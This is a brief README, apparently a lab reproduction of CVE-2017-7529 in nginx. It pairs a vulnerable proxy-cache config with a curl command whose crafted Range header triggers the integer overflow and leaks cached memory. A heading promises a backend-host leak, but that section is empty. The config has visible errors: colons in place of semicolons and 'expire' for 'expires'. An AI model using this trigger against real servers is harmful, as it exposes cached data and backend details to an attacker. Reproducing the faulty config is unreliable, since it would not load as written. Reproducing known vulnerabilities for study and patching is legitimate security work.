# CVE-2017-7529

### nginx config

```
proxy_cache_path /tmp/nginx/cache keys_zone=cache_zone:10m max_size=10G;

server{
    listen      80;
    server_name localhost:

    location /proxy/{
        proxy_pass http://localhost:8080/; 
        add_header X-Proxy-Cache $upstream_cache_status;
        proxy_set_header Host $host;
        proxy_cache cache_zone;
        proxy_cache_valid 200 302 24h;
        proxy_cache_valid any 30m;

        expire 90d;
    }
}

server {
    listen      8080:
    server_name localhost;

    location / {
        root html;
        index index.html index.htm;
    }
}


```

Trigger bug with
```curl -iv http://localhost/proxy/ -r -1000, -9223372036854774808```
- $First_Number: underflow size
- $Second_Number: 0x8000000000000000 - $First_Number

```
# Leak backend api host

```
